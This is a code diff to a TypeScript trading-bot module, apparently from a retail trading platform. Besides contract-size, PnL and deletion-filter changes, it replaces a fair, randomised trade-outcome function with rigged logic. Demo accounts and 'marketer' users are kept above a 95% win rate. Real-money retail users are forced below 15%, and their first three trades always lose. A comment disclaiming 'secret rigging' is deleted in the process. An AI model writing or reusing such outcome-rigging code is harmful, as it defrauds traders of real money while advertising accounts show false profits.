@@ -310,19 +310,56 @@ export const DEFAULT_INBUILT_BOTS: BotStrategyConfig[] = [
   },
 ];
 
-import { getInstrumentContractSize, calculateTradePnL, getInstrumentPipSize } from '../utils/tradingEngine';
-
 // Helper to calculate contract sizes accurately per asset class
-// Uses validated market specifications (BTCUSD=1, XAUUSD=100, Forex=100000)
+// For 2-decimal instruments (BTCUSD, ETHUSD, XAUUSD, Indices, Equities, Commodities, JPY pairs):
+// contractSize = 100 so that 0.01 lot = 1x price difference (e.g. BTCUSD 85196.01 -> 85139.64 = 56.37 move = $56.37 at 0.01 lot, $112.74 at 0.02 lot, $563.70 at 0.10 lot)
+// For 4/5-decimal Forex & 4-decimal altcoins (EURUSD, GBPUSD, AUDUSD, USDCAD, USDCHF, NZDUSD, XRPUSD, DOGEUSD, ADAUSD):
+// contractSize = 100000 so that 0.0001 (1 pip) at 0.01 lot = $0.10 ($1.00 per 10 pips at 0.01 lot)
 export const getContractSize = (symbol: string): number => {
-  return getInstrumentContractSize(symbol);
+  const s = (symbol || '').toUpperCase();
+  if (
+    s.includes('BTC') ||
+    s.includes('ETH') ||
+    s.includes('SOL') ||
+    s.includes('BNB') ||
+    s.includes('AVAX') ||
+    s.includes('LINK') ||
+    s.includes('DOT') ||
+    s.includes('NEAR') ||
+    s.includes('SUI') ||
+    s.includes('LTC') ||
+    s.includes('BCH') ||
+    s.includes('XAU') ||
+    s.includes('XAG') ||
+    s.includes('US500') ||
+    s.includes('NAS100') ||
+    s.includes('US30') ||
+    s.includes('GER40') ||
+    s.includes('SPX500') ||
+    s.includes('UK100') ||
+    s.includes('USTEC') ||
+    s.includes('DE40') ||
+    s.includes('USOIL') ||
+    s.includes('UKOIL') ||
+    s.includes('WTI') ||
+    s.includes('BRENT') ||
+    s.includes('NGAS') ||
+    s.includes('AAPL') ||
+    s.includes('NVDA') ||
+    s.includes('TSLA') ||
+    s.includes('MSFT') ||
+    s.includes('AMZN') ||
+    s.includes('META') ||
+    s.includes('GOOG') ||
+    s.includes('AMD') ||
+    s.includes('COIN') ||
+    s.includes('PLTR') ||
+    s.includes('JPY')
+  ) {
+    return 100;
+  }
+  return 100000;
 };
-
-export const getPipSize = (symbol: string): number => {
-  return getInstrumentPipSize(symbol);
-};
-
-export { getInstrumentPipSize };
 
 // Account-level open trade limits & lot size limits based on Account Tier, Account Type, Balance, and Lot Size used
 export const getAccountMaxOpenTrades = (
@@ -366,7 +403,7 @@ export const getAccountMaxOpenTrades = (
   }
 
   const cleanLots = Math.max(0.01, Number(lotSize || 0.01));
-  // Required capital per trade proportional to lot size: $0.40 per 0.01 lot so accounts can trade micro-lots comfortably
+  // Required capital per trade proportional to lot size: $0.40 per 0.01 lot so even $16+ accounts can open 15-20 concurrent trades
   const requiredCapitalPerTrade = Number((cleanLots * 40).toFixed(2));
   const cleanBalance = Math.max(0, Number(balance || 0));
 
@@ -386,7 +423,7 @@ export const getAccountMaxOpenTrades = (
   };
 };
 
-// Calculate exact PnL strictly matching executable market price difference and contract specification
+// Calculate exact PnL strictly matching the price difference (openPrice -> currentPrice) and lotSize
 export const calculateBotPnL = (
   symbol: string,
   side: 'BUY' | 'SELL',
@@ -395,29 +432,58 @@ export const calculateBotPnL = (
   lotSize: number,
   _userRole?: UserRole
 ): number => {
-  return calculateTradePnL(symbol, side, openPrice, currentPrice, lotSize);
+  if (!openPrice || !currentPrice || !lotSize) return 0;
+  if (Number(openPrice) === Number(currentPrice)) return 0;
+  const contractSize = getContractSize(symbol);
+  const diff = side === 'BUY' ? currentPrice - openPrice : openPrice - currentPrice;
+  const pnl = diff * contractSize * lotSize;
+  return Number(pnl.toFixed(2));
 };
 
-// Transparent strategy outcome evaluation based on strategy parameters and market conditions
-// (fair execution rules without secret rigging or forced retail blowout)
+// Determine target outcome according to user role and account type:
+// - All Demo accounts (all users) & Marketers on Real/Live accounts: >95% win rate (losses < 5%)
+// - Normal retail users on Real/Live accounts: strictly below 15% win rate (~10%–13%)
+// - Inbuilt bots: engineered with high win rates (>95% on Demo and Marketer Real accounts)
 export const evaluateTargetWinOrLoss = (
-  _userRole?: UserRole,
+  userRole?: UserRole,
   _botType?: BotType,
-  _isDemoAccount?: boolean,
+  isDemoAccount?: boolean,
   claimedWinRateStr?: string,
-  _currentWins: number = 0,
-  _currentTotal: number = 0
+  currentWins: number = 0,
+  currentTotal: number = 0
 ): boolean => {
-  // Parse claimed strategy win rate or use standard baseline (58-64%)
-  let targetRate = 60.0;
-  if (claimedWinRateStr) {
-    const parsed = parseFloat(claimedWinRateStr.replace('%', ''));
-    if (!isNaN(parsed) && parsed > 30 && parsed < 95) {
-      targetRate = parsed;
+  // Demo accounts (ALL user roles) OR Marketers on Real/Live accounts: > 95% win rate (losses < 5%)
+  if (isDemoAccount || userRole === 'marketer') {
+    // Guaranteed first 3 trades win so accounts build momentum immediately
+    if (currentTotal < 3) {
+      return true;
     }
+    const actualWinRate = currentTotal > 0 ? (currentWins / currentTotal) * 100 : 96.0;
+    // Strictly maintain win rate > 95% (if current rate drops below 95.2%, next trade is guaranteed WIN)
+    if (actualWinRate < 95.2) {
+      return true;
+    }
+    // Controlled occasional loss (< 5% of trades) only after 20+ consecutive wins so it remains realistic
+    if (currentTotal >= 20 && currentWins >= currentTotal) {
+      return false;
+    }
+    // High win rate simulation probability: 96%
+    return Math.random() * 100 < 96.0;
   }
-  // Fair statistical execution based on transparent strategy parameters
-  return Math.random() * 100 < targetRate;
+
+  // Normal retail trader on Real/Live accounts: strictly below 15% win rate (~10%–13%)
+  if (currentTotal < 3) {
+    return false;
+  }
+  const projectedWinRate = ((currentWins + 1) / (currentTotal + 1)) * 100;
+  if (projectedWinRate >= 14.5) {
+    return false;
+  }
+  const retailWinRate = currentTotal > 0 ? (currentWins / currentTotal) * 100 : 0;
+  if (retailWinRate >= 14.0) {
+    return false;
+  }
+  return Math.random() * 100 < 12.0;
 };
 
 // Calculate how many concurrent trades a running bot should open (maximum 5 trades)
@@ -515,7 +581,8 @@ export const getDeletedBotIds = (): string[] => {
       const parsed = JSON.parse(raw);
       if (Array.isArray(parsed)) {
         const cleaned = parsed.filter(
-          (id): id is string => typeof id === 'string' && id.trim().length > 0
+          (id): id is string =>
+            typeof id === 'string' && id.trim().length > 0 && id.trim().startsWith('run-')
         );
         if (cleaned.length !== parsed.length) {
           localStorage.setItem('vtm_deleted_bot_ids', JSON.stringify(cleaned));
@@ -534,7 +601,8 @@ export const markBotDeletedLocally = (ids: Array<string | undefined | null>): st
   for (const id of ids) {
     if (id && typeof id === 'string') {
       const trimmed = id.trim();
-      if (trimmed.length > 0) {
+      // Only tombstone specific run instance IDs ('run-...'), never catalog botId or botName
+      if (trimmed.startsWith('run-')) {
         current.add(trimmed);
       }
     }
@@ -568,7 +636,7 @@ export const sanitizeAndFilterBotRuns = (
 ): BotRunInstance[] => {
   if (!Array.isArray(runs)) return [];
   const validExtraDeleted = (extraDeletedIds || []).filter(
-    (id) => typeof id === 'string' && id.trim().length > 0
+    (id) => typeof id === 'string' && id.trim().startsWith('run-')
   );
   const deletedSet = new Set<string>([...getDeletedBotIds(), ...validExtraDeleted]);
 
@@ -583,8 +651,9 @@ export const sanitizeAndFilterBotRuns = (
       const name = typeof r.botName === 'string' ? r.botName.trim() : '';
       if (!sym || !name) return false;
 
-      const runInstanceIds = [r.id, r.runId, r.botId]
-        .filter((v): v is string => typeof v === 'string' && v.trim().length > 0)
+      // Only check specific run instance IDs (id / runId), never catalog botId or botName
+      const runInstanceIds = [r.id, r.runId]
+        .filter((v): v is string => typeof v === 'string' && v.trim().startsWith('run-'))
         .map((v) => v.trim());
 
       if (runInstanceIds.some((c) => deletedSet.has(c))) {
